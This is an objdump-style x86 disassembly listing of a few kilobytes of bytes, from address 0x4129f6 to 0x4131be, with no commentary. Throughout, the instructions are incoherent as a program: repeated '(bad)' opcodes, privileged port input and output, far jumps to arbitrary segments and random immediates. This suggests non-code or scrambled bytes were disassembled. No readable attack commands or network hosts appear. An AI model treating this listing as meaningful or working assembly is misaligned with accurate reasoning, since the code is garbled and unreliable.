  4129f6:	mov    edi,0xa09ff22d
  4129fb:	cmp    eax,0x7987fa9
  412a00:	daa    
  412a01:	test   al,0x88
  412a03:	pop    ebx
  412a04:	add    eax,0x27028d2c
  412a09:	cs cmp ecx,ecx
  412a0c:	out    0x25,eax
  412a0e:	leave  
  412a0f:	fcos   
  412a11:	sbb    DWORD PTR [edi+0x6c1d520],0xa08502b0
  412a1b:	loope  0x4129ff
  412a1d:	lds    ebp,FWORD PTR [ecx-0x45]
  412a20:	pop    edi
  412a21:	fnstcw WORD PTR [edx-0x61]
  412a24:	addr16 popf 
  412a26:	les    ebp,FWORD PTR [edx+ebp*8]
  412a29:	js     0x412a1e
  412a2b:	int    0xe7
  412a2d:	fchs   
  412a2f:	test   cl,0x7c
  412a32:	arpl   WORD PTR [ebp+0x2a7ffdde],di
  412a38:	imul   esp,DWORD PTR [ecx+0x6952401e],0x61d1242
  412a42:	mov    dx,0x909
  412a46:	sahf   
  412a47:	jo     0x412a8c
  412a49:	add    DWORD PTR [ebx+eiz*2+0x33ccc542],ebx
  412a50:	imul   esi,DWORD PTR [ecx+0x43],0x3b61b0ab
  412a57:	cdq    
  412a58:	push   eax
  412a59:	sub    BYTE PTR [esi-0x29568a97],ch
  412a5f:	fisubr DWORD PTR [ebx-0x32]
  412a62:	outs   dx,BYTE PTR ds:[esi]
  412a63:	fs sub bh,cl
  412a66:	sub    al,BYTE PTR [ecx+ebx*1-0x1aff0b0c]
  412a6d:	into   
  412a6e:	test   ch,dh
  412a70:	inc    esp
  412a71:	in     eax,0x59
  412a73:	rcr    DWORD PTR ds:0x1d072ab6,cl
  412a79:	mov    ah,0x92
  412a7b:	ds ins BYTE PTR es:[edi],dx
  412a7d:	sbb    DWORD PTR [esi+ebx*2],ecx
  412a80:	dec    ebx
  412a81:	(bad)  
  412a82:	and    al,0xa1
  412a84:	pop    esp
  412a85:	mov    bl,0x6a
  412a87:	add    ah,BYTE PTR [esi+edx*1-0x64ca8181]
  412a8e:	stos   DWORD PTR es:[edi],eax
  412a8f:	repnz or BYTE PTR [esi+0x30],dl
  412a93:	aad    0x46
  412a95:	inc    esp
  412a96:	mov    dh,0xab
  412a98:	sub    DWORD PTR [eax-0x4983f2d0],esp
  412a9e:	aaa    
  412a9f:	enter  0xad87,0x6
  412aa3:	pop    esp
  412aa4:	mov    dl,0x99
  412aa6:	mov    edx,esp
  412aa8:	mov    al,ds:0x8ea0033c
  412aad:	jo     0x412a8d
  412aaf:	sub    DWORD PTR [edi+0x7da88c69],eax
  412ab5:	push   edi
  412ab6:	(bad)  
  412ab9:	or     BYTE PTR [esi],dh
  412abb:	jb     0x412ada
  412abd:	sbb    ch,cl
  412abf:	or     BYTE PTR [eax-0x48],0x7c
  412ac3:	or     bh,BYTE PTR [ecx+ecx*8]
  412ac6:	mov    BYTE PTR [esi-0x7f],dl
  412ac9:	fnstsw WORD PTR [edi]
  412acb:	lea    esi,[esi]
  412acd:	pop    ebx
  412ace:	push   esi
  412acf:	xchg   ebp,eax
  412ad0:	xchg   ebp,eax
  412ad1:	gs pop ebp
  412ad3:	lahf   
  412ad4:	xlat   BYTE PTR fs:[ebx]
  412ad6:	xchg   esp,eax
  412ad7:	or     BYTE PTR [edi],ch
  412ad9:	lods   al,BYTE PTR ds:[esi]
  412ada:	js     0x412a64
  412adc:	jge    0x412abe
  412ade:	xor    esi,DWORD PTR [ebx-0xcae60ac]
  412ae4:	mov    bh,0x49
  412ae6:	in     al,dx
  412ae7:	mov    ch,0x96
  412ae9:	xor    DWORD PTR [ebp-0x43],ecx
  412aec:	sbb    DWORD PTR [edx],ecx
  412aee:	in     eax,0x64
  412af0:	rcl    BYTE PTR [ebx],0x84
  412af3:	pop    eax
  412af4:	mov    bh,0xec
  412af6:	mov    dl,0xd1
  412af8:	jle    0x412ae1
  412afa:	add    DWORD PTR [esi],ebx
  412afc:	pushf  
  412afd:	xchg   ecx,eax
  412afe:	ja     0x412b2f
  412b00:	add    eax,DWORD PTR [edx+0x4ff7929d]
  412b06:	and    DWORD PTR [edx],edi
  412b08:	mov    ch,0x47
  412b0a:	mov    DWORD PTR [ebp-0x2b],edi
  412b0d:	into   
  412b0e:	push   edx
  412b0f:	add    cl,al
  412b11:	arpl   WORD PTR [edx+0x282fa5ce],bx
  412b17:	pop    eax
  412b18:	push   edx
  412b19:	(bad)  
  412b1a:	dec    ebp
  412b1b:	add    DWORD PTR [esi+0x6c],edi
  412b1e:	sbb    ah,BYTE PTR [eax]
  412b20:	les    esp,FWORD PTR [esi+0x373bfc33]
  412b26:	cmp    ebp,ebx
  412b28:	pop    DWORD PTR [eax+ecx*4-0x60]
  412b2c:	xor    al,0x5e
  412b2e:	pop    ebx
  412b2f:	test   BYTE PTR [ebx-0x58],0x43
  412b33:	push   ebp
  412b34:	sbb    DWORD PTR [edi-0x69ac0e6c],edx
  412b3a:	int3   
  412b3b:	aad    0xb3
  412b3d:	sub    DWORD PTR [eax-0x78],eax
  412b40:	push   es
  412b41:	mov    es,WORD PTR [eax+0x6fb1316c]
  412b47:	cmp    eax,0x45fc92ac
  412b4c:	loope  0x412b1a
  412b4e:	jne    0x412b9c
  412b50:	mov    ah,0xea
  412b52:	and    ebp,DWORD PTR [eax+ebx*4-0xb]
  412b56:	mov    BYTE PTR [ecx],dl
  412b58:	push   esi
  412b59:	mov    al,0x92
  412b5b:	cld    
  412b5c:	inc    ebp
  412b5d:	mov    DWORD PTR gs:[esi+0x3c937099],ebx
  412b64:	xchg   esi,eax
  412b65:	bound  ecx,QWORD PTR ds:0xe7015d14
  412b6b:	mov    bh,0xe4
  412b6d:	mov    eax,0xb42ab647
  412b72:	imul   edx,DWORD PTR [esi],0xffffffca
  412b75:	aad    0x73
  412b77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b78:	pop    ecx
  412b79:	push   cs
  412b7a:	cdq    
  412b7b:	ds loop 0x412b5a
  412b7e:	idiv   BYTE PTR [esi+0x1fc6f881]
  412b84:	jno    0x412bcb
  412b86:	pop    eax
  412b87:	sbb    dh,BYTE PTR [eax+0x52]
  412b8a:	xor    DWORD PTR ds:0xb06dc851,edx
  412b90:	mov    bh,0xd9
  412b92:	in     eax,0x54
  412b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b95:	xor    cl,bh
  412b97:	mov    ah,0x2a
  412b99:	je     0x412b73
  412b9b:	fistp  DWORD PTR [edi]
  412b9d:	pusha  
  412b9e:	aad    0xf4
  412ba0:	retf   
  412ba1:	cmp    al,0xf4
  412ba3:	aad    0x29
  412ba5:	sbb    ah,BYTE PTR [esi+0x14]
  412ba8:	push   cs
  412ba9:	arpl   WORD PTR [ecx-0x75],cx
  412bac:	sbb    cl,BYTE PTR [esi+0x54]
  412baf:	popa   
  412bb0:	add    eax,0x6aad7c1d
  412bb5:	not    DWORD PTR [ecx]
  412bb7:	lahf   
  412bb8:	stos   BYTE PTR es:[edi],al
  412bb9:	gs popa 
  412bbb:	sbb    DWORD PTR [ebp-0x324de379],0x4f114529
  412bc5:	aam    0x61
  412bc7:	jmp    0x25e5858b
  412bcc:	gs jb  0x412b5e
  412bcf:	(bad)  
  412bd1:	ins    DWORD PTR es:[edi],dx
  412bd2:	push   esi
  412bd3:	je     0x412b81
  412bd5:	cmp    ebx,ebp
  412bd7:	inc    ecx
  412bd8:	push   0x42c0610d
  412bdd:	dec    esi
  412bde:	pop    edx
  412bdf:	or     edi,ecx
  412be1:	adc    bh,bh
  412be3:	dec    ebx
  412be4:	pop    ecx
  412be5:	bnd jg 0x412bdc
  412be8:	stos   BYTE PTR es:[edi],al
  412be9:	scas   al,BYTE PTR es:[edi]
  412bea:	out    0x5f,al
  412bec:	mov    ebx,0x2384d4b4
  412bf1:	ins    DWORD PTR es:[edi],dx
  412bf2:	push   ecx
  412bf3:	xor    DWORD PTR [ebx+0xb],edx
  412bf6:	sbb    esp,DWORD PTR [edx]
  412bf8:	ss pop ds
  412bfa:	mov    edx,0xa502aea7
  412bff:	mov    ?,WORD PTR [edi+0x55a29731]
  412c05:	pop    ds
  412c06:	(bad)  
  412c07:	in     eax,0xa2
  412c09:	mov    ebp,0xe6d7905e
  412c0e:	clc    
  412c0f:	mov    dl,0x35
  412c11:	clc    
  412c12:	shr    esi,1
  412c14:	cmp    dh,BYTE PTR [ebp-0x4767f2bd]
  412c1a:	fs push edx
  412c1c:	cwde   
  412c1d:	mov    esi,0x51180baf
  412c22:	cmp    eax,0x1a816193
  412c27:	pop    edx
  412c28:	outs   dx,BYTE PTR ds:[esi]
  412c29:	rcl    ch,1
  412c2b:	mov    esp,0xa35beee4
  412c30:	outs   dx,BYTE PTR ds:[esi]
  412c31:	xor    DWORD PTR [edx],esi
  412c33:	push   ds
  412c34:	gs mov dh,0xd3
  412c37:	push   ds
  412c38:	(bad)  
  412c39:	adc    DWORD PTR [edi+eax*2-0x24f87ead],ecx
  412c40:	outs   dx,BYTE PTR ds:[esi]
  412c41:	mov    ds:0x8649be0a,eax
  412c46:	push   ebx
  412c47:	(bad)  
  412c48:	or     al,0xce
  412c4a:	mov    ss,WORD PTR [ebp+0x46335b91]
  412c50:	ja     0x412c8e
  412c52:	lods   eax,DWORD PTR ds:[esi]
  412c53:	ins    BYTE PTR es:[edi],dx
  412c54:	ds int3 
  412c56:	jns    0x412cd0
  412c58:	dec    ebx
  412c59:	pop    ebx
  412c5a:	adc    ch,ah
  412c5c:	mov    ds:0xb867ca1,al
  412c61:	(bad)  
  412c62:	push   esi
  412c63:	pop    esi
  412c64:	rcr    DWORD PTR [eax+0x47f981d8],cl
  412c6a:	inc    ecx
  412c6b:	inc    esi
  412c6c:	pop    eax
  412c6d:	mov    ch,0x86
  412c6f:	scas   al,BYTE PTR es:[edi]
  412c70:	and    BYTE PTR [ebx-0x4026614e],dh
  412c76:	sub    DWORD PTR ds:0x1dbb3793,0xe
  412c7d:	xor    eax,0xe0c75b47
  412c82:	xchg   ebp,eax
  412c83:	popf   
  412c84:	cli    
  412c85:	mov    ebx,0x415055ef
  412c8a:	ret    0x567a
  412c8d:	jnp    0x412c0f
  412c8f:	enter  0xaf8,0x7c
  412c93:	in     al,0xdf
  412c95:	mov    dl,0xd4
  412c97:	mov    ebx,0x21f21bee
  412c9c:	sbb    DWORD PTR [edi],eax
  412c9e:	loop   0x412c39
  412ca0:	aas    
  412ca1:	cmp    eax,0x926a62a4
  412ca6:	xchg   ecx,eax
  412ca7:	lods   eax,DWORD PTR ds:[esi]
  412ca8:	or     al,ah
  412caa:	push   0xee072abf
  412caf:	dec    edi
  412cb0:	sbb    BYTE PTR [ebx+0x5c],cl
  412cb3:	shl    DWORD PTR [ecx-0x604c5494],cl
  412cb9:	pusha  
  412cba:	test   BYTE PTR [ecx+0x1150efaa],dh
  412cc0:	leave  
  412cc1:	sbb    DWORD PTR [edx],edi
  412cc3:	xchg   edx,eax
  412cc4:	rcl    DWORD PTR [esi],0xaf
  412cc7:	pop    ecx
  412cc8:	or     ebx,DWORD PTR [esi]
  412cca:	mov    eax,ss
  412ccc:	push   ecx
  412ccd:	sbb    BYTE PTR [esi-0x72],0xa
  412cd1:	sub    edi,DWORD PTR [ecx+0x39]
  412cd4:	and    ebp,0xfe1400a
  412cda:	push   cs
  412cdb:	push   ebx
  412cdc:	stos   DWORD PTR es:[edi],eax
  412cdd:	adc    eax,0xbd20e561
  412ce2:	mov    BYTE PTR [esi-0x7fc2371e],dl
  412ce8:	adc    esi,ebx
  412cea:	dec    ecx
  412ceb:	dec    esi
  412cec:	arpl   WORD PTR [edi+edx*1-0x5e53187e],ax
  412cf3:	dec    esi
  412cf4:	xor    BYTE PTR [edi],ch
  412cf6:	mov    ds:0xe054cf99,al
  412cfb:	adc    eax,0x41ecad61
  412d00:	ins    BYTE PTR es:[edi],dx
  412d01:	leave  
  412d02:	mov    DWORD PTR [eax],ebx
  412d04:	sbb    dl,BYTE PTR [eax-0x22bf357f]
  412d0a:	jmp    0x412cbf
  412d0c:	mov    bh,0x59
  412d0e:	(bad)  [edi]
  412d10:	(bad)  
  412d11:	and    DWORD PTR [esi-0xd],0x4a31b9ce
  412d18:	pop    edx
  412d19:	scas   al,BYTE PTR es:[edi]
  412d1a:	xor    eax,DWORD PTR [eax+eiz*8-0xc8e00ef]
  412d21:	or     ah,BYTE PTR [edi+ecx*8+0x30]
  412d25:	jae    0x412d97
  412d27:	mov    ch,0x6e
  412d29:	mov    eax,0x36120db6
  412d2e:	and    ebx,DWORD PTR [eax]
  412d30:	push   ebx
  412d31:	nop
  412d32:	imul   eax,DWORD PTR [esi+0x7e],0xfed27331
  412d39:	xchg   edi,eax
  412d3a:	addr16 mov dh,0xd2
  412d3d:	push   0xffffffb2
  412d3f:	cwde   
  412d40:	add    dh,BYTE PTR [edx+0x6e]
  412d43:	jecxz  0x412d5f
  412d45:	popf   
  412d46:	adc    ecx,esp
  412d48:	outs   dx,BYTE PTR ds:[esi]
  412d49:	xor    ch,cl
  412d4b:	fld    DWORD PTR [edx-0x1a]
  412d4e:	sbb    ecx,DWORD PTR [edi-0x616f7dd9]
  412d54:	cmp    esi,edx
  412d56:	add    al,0x20
  412d58:	ss test ch,al
  412d5b:	mov    ss,ecx
  412d5d:	in     al,0xe
  412d5f:	popa   
  412d60:	mov    ch,0x5b
  412d62:	popf   
  412d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d64:	jg     0x412dbd
  412d66:	or     bl,cl
  412d68:	dec    BYTE PTR [ecx+0x593b3f41]
  412d6e:	pop    eax
  412d6f:	or     dh,0x48
  412d72:	and    edi,DWORD PTR [ebp+0x6cb6a02a]
  412d78:	jl     0x412df1
  412d7a:	in     al,dx
  412d7b:	sbb    ch,BYTE PTR [eax-0x3202c8c8]
  412d81:	in     eax,0x4
  412d83:	mov    dl,0xc6
  412d85:	fsub   QWORD PTR [ebx]
  412d87:	int    0x7e
  412d89:	jnp    0x412d83
  412d8b:	imul   esp,DWORD PTR [esi-0x9f64d8],0xfffffff1
  412d92:	fadd   QWORD PTR [ebx+0x21]
  412d95:	hlt    
  412d96:	das    
  412d97:	call   0xde51cfb5
  412d9c:	rcr    DWORD PTR [esi-0x3f4e89d2],1
  412da2:	rcr    BYTE PTR [ecx+esi*4-0xb20dec3],0xca
  412daa:	cmp    eax,0x3684228d
  412daf:	cmp    al,0x46
  412db1:	pop    ecx
  412db2:	xchg   edi,eax
  412db3:	mov    bh,BYTE PTR [eax+0x15d70e83]
  412db9:	repz mov edx,0xc59b1eab
  412dbf:	pop    ss
  412dc0:	nop
  412dc1:	pop    edi
  412dc2:	dec    ecx
  412dc3:	(bad)  
  412dc5:	fwait
  412dc6:	add    BYTE PTR [edi+0x78],ch
  412dc9:	fdivr  QWORD PTR [ebx]
  412dcb:	or     DWORD PTR [edi-0x14412d95],0x50
  412dd2:	lock nop
  412dd4:	add    edx,esi
  412dd6:	xchg   ebp,eax
  412dd7:	push   edx
  412dd8:	xchg   esi,eax
  412dd9:	xor    BYTE PTR [edx],bh
  412ddb:	(bad)  
  412ddd:	int    0x8d
  412ddf:	push   ss
  412de0:	shl    dl,0x23
  412de3:	pop    ds
  412de4:	add    eax,DWORD PTR [ebp-0x71fea91f]
  412dea:	mov    dh,BYTE PTR [ebx]
  412dec:	mov    eax,ebp
  412dee:	rol    BYTE PTR [esp+eiz*4],cl
  412df1:	mov    WORD PTR [edi+eax*2+0x19],ss
  412df5:	(bad)  
  412df6:	push   ebx
  412df7:	fnstsw WORD PTR [edi]
  412df9:	jb     0x412e16
  412dfb:	jbe    0x412e17
  412dfd:	mov    al,0xab
  412dff:	and    BYTE PTR [ebx],cl
  412e01:	mov    ah,al
  412e03:	sti    
  412e04:	sbb    bl,al
  412e06:	jnp    0x412e17
  412e08:	pop    ebp
  412e09:	mov    ch,0xca
  412e0b:	aam    0x8
  412e0d:	sbb    eax,0x358a5819
  412e12:	mov    ch,BYTE PTR [ebx+0x5d9d78c5]
  412e18:	dec    ecx
  412e19:	lods   al,BYTE PTR ds:[esi]
  412e1a:	les    edx,FWORD PTR [ebp+ebx*8-0x54]
  412e1e:	lods   al,BYTE PTR ds:[esi]
  412e1f:	mov    al,0x68
  412e21:	test   DWORD PTR [esi-0x1c],ebp
  412e24:	aad    0x2a
  412e26:	jo     0x412e28
  412e28:	aaa    
  412e29:	dec    edi
  412e2a:	and    ch,BYTE PTR [esi]
  412e2c:	ror    bh,0xb2
  412e2f:	mov    esp,0x9b8d8fc8
  412e34:	jb     0x412e24
  412e36:	adc    BYTE PTR gs:[eax+0x31],ah
  412e3a:	call   0x3f845c89
  412e3f:	inc    edx
  412e40:	ret    
  412e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e42:	hlt    
  412e43:	jmp    0xc923:0x16382d71
  412e4a:	(bad)  
  412e4b:	sbb    BYTE PTR [ecx],dh
  412e4d:	sbb    BYTE PTR [ecx+edi*2+0x2a],bh
  412e51:	sahf   
  412e52:	jb     0x412e60
  412e54:	test   esi,0xb3d736fe
  412e5a:	and    eax,DWORD PTR [ecx+0x5bc676ce]
  412e60:	in     al,0x7b
  412e62:	xchg   ecx,eax
  412e63:	rcl    DWORD PTR [ebp+esi*4+0x62],cl
  412e67:	jnp    0x412e21
  412e69:	push   ebx
  412e6a:	jmp    0x4637aae7
  412e6f:	mov    DWORD PTR [esi+0x31251d80],esi
  412e75:	xor    al,0x99
  412e77:	addr16 and eax,edi
  412e7a:	fnsave [edx]
  412e7c:	retf   
  412e7d:	ficomp DWORD PTR ds:0xb4174416
  412e83:	pop    ebp
  412e84:	xor    al,BYTE PTR [ecx]
  412e86:	jno    0x412e55
  412e88:	adc    DWORD PTR [ebp-0x3f012c00],ecx
  412e8e:	(bad)  
  412e8f:	cmp    ebp,DWORD PTR [edx+0x6cf6a4c7]
  412e95:	inc    esp
  412e96:	xchg   esi,eax
  412e97:	fdivr  QWORD PTR [ebx]
  412e99:	pop    esi
  412e9a:	sar    BYTE PTR [esi-0x59],0x50
  412e9e:	pop    sp
  412ea0:	mov    WORD PTR [esi],fs
  412ea2:	hlt    
  412ea3:	pop    ebx
  412ea4:	leave  
  412ea5:	ja     0x412f14
  412ea7:	mov    bl,0x47
  412ea9:	clc    
  412eaa:	fst    DWORD PTR [eax]
  412eac:	push   ebp
  412ead:	push   esp
  412eae:	(bad)  
  412eaf:	int    0xe
  412eb1:	sti    
  412eb2:	out    dx,al
  412eb3:	or     edi,DWORD PTR [edi-0x11c00884]
  412eb9:	dec    ebx
  412eba:	push   ebx
  412ebb:	pusha  
  412ebc:	mov    ebx,0x42d0f539
  412ec1:	adc    BYTE PTR [esi],cl
  412ec3:	pushf  
  412ec4:	or     ch,BYTE PTR ds:0x3e7815ae
  412eca:	test   eax,0x3d657565
  412ecf:	iret   
  412ed0:	test   BYTE PTR [eax+eax*1+0x5b],al
  412ed4:	call   0x5a8b:0xae027505
  412edb:	loop   0x412f2d
  412edd:	sbb    eax,DWORD PTR [ecx-0x3]
  412ee0:	into   
  412ee1:	push   edi
  412ee2:	aad    0xc0
  412ee4:	pop    ecx
  412ee5:	sbb    dl,ah
  412ee7:	mov    WORD PTR [eax-0x24],fs
  412eea:	xchg   ebx,eax
  412eeb:	data16 mov ch,0xbe
  412eee:	dec    ecx
  412eef:	sub    DWORD PTR [ebx+eax*8-0x7e],ecx
  412ef3:	add    esi,DWORD PTR [esi-0x1c]
  412ef6:	test   al,0x76
  412ef8:	aam    0x1f
  412efa:	rcr    BYTE PTR [ebx],0x8b
  412efd:	push   0x68
  412eff:	test   DWORD PTR [ecx],edi
  412f01:	repz pop ds
  412f03:	mov    bl,0xc7
  412f05:	xor    al,0xbe
  412f07:	fimul  DWORD PTR [ebx]
  412f09:	mov    dl,0x2f
  412f0b:	mov    dl,0x62
  412f0d:	pop    ebx
  412f0e:	repnz xchg ecx,eax
  412f10:	jmp    0xa4cd:0x1c6e8aab
  412f17:	or     al,0x27
  412f19:	pop    eax
  412f1a:	in     al,dx
  412f1b:	sub    esp,DWORD PTR [esi-0x2]
  412f1e:	xchg   ecx,eax
  412f1f:	adc    esi,eax
  412f21:	jno    0x412fa1
  412f23:	sbb    bh,cl
  412f25:	rcr    DWORD PTR [edx+0x4ec20a9a],1
  412f2b:	imul   ecx,DWORD PTR [ebp-0x50f83d47],0x37
  412f32:	jno    0x412f3f
  412f34:	ficom  DWORD PTR [ecx-0x1]
  412f37:	ja     0x412f36
  412f39:	and    edx,DWORD PTR [edx+0x327279c1]
  412f3f:	push   es
  412f40:	mov    ds:0x87e4efb2,al
  412f45:	and    DWORD PTR ds:0x26e31fbc,edi
  412f4b:	mov    ebx,0xc2ebfc71
  412f50:	daa    
  412f51:	push   ecx
  412f52:	pop    ss
  412f53:	add    DWORD PTR [ecx-0x19860d5b],ebx
  412f59:	in     al,dx
  412f5a:	push   ebp
  412f5b:	dec    esp
  412f5c:	mov    cl,BYTE PTR [edx-0xff0103]
  412f62:	popa   
  412f63:	jo     0x412fcf
  412f65:	cmp    BYTE PTR [ecx+0x7ca289bc],0xdd
  412f6c:	mov    ds:0x619caad3,al
  412f71:	add    DWORD PTR [edi],ebx
  412f73:	stos   BYTE PTR es:[edi],al
  412f74:	pop    edi
  412f75:	cmc    
  412f76:	mov    ds:0xf424da4f,al
  412f7b:	test   eax,0x5938039d
  412f80:	jmp    0x116d2e89
  412f85:	xchg   esi,eax
  412f86:	mov    dl,BYTE PTR ds:0x63652395
  412f8c:	ds ins BYTE PTR es:[edi],dx
  412f8e:	mov    bl,0x67
  412f90:	test   al,dl
  412f92:	and    al,0x40
  412f94:	xchg   DWORD PTR [esi],ebx
  412f96:	pop    esp
  412f97:	jns    0x412fb9
  412f99:	add    bh,0xa5
  412f9c:	sbb    BYTE PTR [ecx+ebx*4-0x1a],ah
  412fa0:	pop    ds
  412fa1:	or     esi,DWORD PTR ds:0x9211a074
  412fa7:	fstp   QWORD PTR [edx]
  412fa9:	cmp    ah,al
  412fab:	fidivr DWORD PTR [edi+ecx*1+0x78]
  412faf:	jb     0x412fad
  412fb1:	xlat   BYTE PTR ds:[ebx]
  412fb2:	(bad)  [ebp+0x24]
  412fb5:	jne    0x412f57
  412fb7:	adc    DWORD PTR [eax],eax
  412fb9:	test   eax,0x32b769f0
  412fbe:	fldenv [edi]
  412fc0:	mov    BYTE PTR [ebx-0x30],dh
  412fc3:	loopne 0x412fb9
  412fc5:	jmp    0x412f63
  412fc7:	sahf   
  412fc8:	pop    ecx
  412fc9:	nop
  412fca:	cmc    
  412fcb:	loopne 0x412fb2
  412fcd:	scas   al,BYTE PTR es:[edi]
  412fce:	and    al,0xb2
  412fd0:	mov    cs,WORD PTR [ebx]
  412fd2:	test   edi,ebp
  412fd4:	and    eax,0x69d25af7
  412fd9:	push   eax
  412fda:	cmp    esi,eax
  412fdc:	pushf  
  412fdd:	lahf   
  412fde:	(bad)  
  412fdf:	xor    al,0x37
  412fe1:	lods   al,BYTE PTR ds:[esi]
  412fe2:	dec    ebp
  412fe3:	data16 aad 0xa1
  412fe6:	mov    ah,0xf8
  412fe8:	dec    ebp
  412fe9:	cmc    
  412fea:	out    dx,eax
  412feb:	jae    0x413029
  412fed:	push   ss
  412fee:	out    0xc1,al
  412ff0:	sub    BYTE PTR [eax],ch
  412ff2:	(bad)  
  412ff3:	jl     0x412ff0
  412ff5:	sahf   
  412ff6:	add    eax,0xab9448a6
  412ffb:	fadd   QWORD PTR [ebp+0x4b1c7245]
  413001:	stos   DWORD PTR es:[edi],eax
  413002:	rcl    BYTE PTR [eax],cl
  413004:	(bad)  
  413005:	fimul  WORD PTR [edi-0x41c62d18]
  41300b:	(bad)  
  41300d:	pushf  
  41300e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300f:	outs   dx,DWORD PTR ds:[esi]
  413010:	sbb    DWORD PTR [ebx],ebx
  413012:	mov    ah,0xf3
  413014:	(bad)  
  413015:	xor    al,0xcc
  413017:	test   DWORD PTR [ebx],eax
  413019:	pushw  cs
  41301b:	daa    
  41301c:	dec    edi
  41301d:	ins    DWORD PTR es:[edi],dx
  41301e:	pop    ebx
  41301f:	sysenter 
  413021:	inc    ebx
  413022:	inc    edx
  413023:	jp     0x412fae
  413025:	data16 (bad) 
  413027:	std    
  413028:	(bad)  
  413029:	das    
  41302a:	or     esp,esi
  41302c:	leave  
  41302d:	mov    ebx,0x1c0aeab
  413032:	into   
  413033:	cli    
  413034:	xchg   ebp,eax
  413035:	adc    edx,DWORD PTR [ecx]
  413037:	fisub  WORD PTR [ebx+0x60]
  41303a:	and    ebx,esp
  41303c:	pop    esi
  41303d:	sar    DWORD PTR [edi-0x50e67b49],0x6b
  413044:	fistp  DWORD PTR ds:0x772a5ebe
  41304a:	pop    edi
  41304b:	xor    eax,0x41bad6be
  413050:	inc    edx
  413051:	pop    ebp
  413052:	push   esp
  413053:	mov    edx,0xc7607d03
  413058:	sbb    bl,cl
  41305a:	push   edx
  41305b:	and    edx,DWORD PTR ds:0x289edae1
  413061:	pop    edx
  413062:	push   edx
  413063:	and    ebp,DWORD PTR [edx-0x53]
  413066:	(bad)  
  413067:	jmp    0xde17:0xb7c78e0
  41306e:	mov    BYTE PTR [ebx],ah
  413070:	repnz fcom DWORD PTR [ebp+eiz*1-0x36]
  413075:	pop    ss
  413076:	sbb    al,0x22
  413078:	and    ah,ch
  41307a:	aas    
  41307b:	sub    dl,BYTE PTR [ecx]
  41307d:	aam    0x4b
  41307f:	fld    DWORD PTR [edx+0x3c]
  413082:	or     eax,0xc5a2e881
  413087:	sbb    DWORD PTR [ecx-0xd],ecx
  41308a:	imul   esp,DWORD PTR [edi+0x56db1478],0x6f5a3487
  413094:	addr16 ret 0x1adc
  413098:	push   es
  413099:	jo     0x41304f
  41309b:	das    
  41309c:	lds    ebx,FWORD PTR [eax+0x4e]
  41309f:	sbb    DWORD PTR ds:0x7b7d722b,0xf4e94d99
  4130a9:	adc    eax,edi
  4130ab:	push   es
  4130ac:	mov    edx,0x467720ff
  4130b1:	fbstp  TBYTE PTR [eax]
  4130b3:	add    bh,BYTE PTR [esi-0x10078aa]
  4130b9:	xor    eax,0x21c6462b
  4130be:	dec    eax
  4130bf:	cmp    al,0x1c
  4130c1:	adc    eax,0xea7f9f30
  4130c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c7:	xchg   DWORD PTR [ebx-0x32],ebp
  4130ca:	inc    ebx
  4130cb:	mov    edx,DWORD PTR [eax+0x8]
  4130ce:	lea    ebx,[esi+0x4700600a]
  4130d4:	fld    QWORD PTR [esi+0x22]
  4130d7:	int    0x14
  4130d9:	push   esi
  4130da:	repz xor DWORD PTR ds:0x2081b577,ebx
  4130e1:	enter  0xf267,0x9f
  4130e5:	dec    edi
  4130e6:	or     BYTE PTR [ebx+0x5b1beff3],cl
  4130ec:	in     eax,dx
  4130ed:	pusha  
  4130ee:	xor    BYTE PTR [ebx],al
  4130f0:	and    DWORD PTR [esp+ecx*2+0x6a136333],eax
  4130f7:	mov    WORD PTR [ebx],?
  4130f9:	push   edi
  4130fa:	pop    edx
  4130fb:	push   esi
  4130fc:	mov    ch,0x15
  4130fe:	repnz push 0x4f
  413101:	cli    
  413102:	adc    ebx,edi
  413104:	push   edi
  413105:	ds in  eax,0x59
  413108:	xor    eax,0xb8af680d
  41310d:	jge    0x4130b9
  41310f:	pushf  
  413110:	push   0xffffffde
  413112:	mov    esp,0x8a36d1c2
  413117:	inc    eax
  413118:	out    0x7,al
  41311a:	push   ecx
  41311b:	xchg   esp,eax
  41311c:	jge    0x413167
  41311e:	fild   WORD PTR [ebp+0x3b69fa39]
  413124:	pop    edx
  413125:	cmp    ebx,eax
  413127:	jecxz  0x413144
  413129:	add    DWORD PTR [eax+0x5521bab0],eax
  41312f:	ds mov cl,0x91
  413132:	adc    al,0x96
  413134:	gs push 0x58cd8b15
  41313a:	adc    eax,0x6ecb0a12
  41313f:	scas   al,BYTE PTR es:[edi]
  413140:	aam    0x89
  413142:	sub    BYTE PTR [eax+0x55a0e84e],0xeb
  413149:	and    DWORD PTR ds:0x9459c2f7,ebx
  41314f:	push   eax
  413150:	retf   0xd78d
  413153:	and    eax,0x155b51ab
  413158:	hlt    
  413159:	test   al,0x86
  41315b:	fist   DWORD PTR [ebx]
  41315d:	jno    0x413112
  41315f:	or     al,0xb4
  413161:	jnp    0x4131bb
  413163:	stos   BYTE PTR es:[edi],al
  413164:	repnz xchg ebx,eax
  413166:	push   ecx
  413167:	dec    ebx
  413168:	adc    cl,BYTE PTR [ebp+0xa]
  41316b:	and    DWORD PTR [esi+edx*4-0x1db5a802],edx
  413172:	push   eax
  413173:	sub    BYTE PTR [ebp+0x19],cl
  413176:	mov    al,0xdf
  413178:	leave  
  413179:	mov    ds:0xf9679279,eax
  41317e:	dec    edx
  41317f:	ins    BYTE PTR es:[edi],dx
  413180:	ret    0x4f43
  413183:	xchg   DWORD PTR [eax],esp
  413185:	call   0x668d:0x73c3e3e0
  41318c:	jno    0x4131e2
  41318e:	inc    esi
  41318f:	fild   DWORD PTR [ebx+0x62c69967]
  413195:	jle    0x413196
  413197:	aaa    
  413198:	pop    edi
  413199:	aad    0xf8
  41319b:	xor    eax,0x5151367c
  4131a0:	in     al,dx
  4131a1:	fs jmp 0xb1a3:0x1b5b2212
  4131a9:	daa    
  4131aa:	mov    edx,0x9293bce5
  4131af:	jl     0x4131ab
  4131b1:	mov    bl,0x97
  4131b3:	xchg   esp,eax
  4131b4:	out    0x20,eax
  4131b6:	out    dx,al
  4131b7:	xor    esp,esp
  4131b9:	jae    0x413222
  4131bb:	dec    eax
  4131bc:	xchg   edi,eax
  4131bd:	dec    esp
  4131be:	pop    ebx
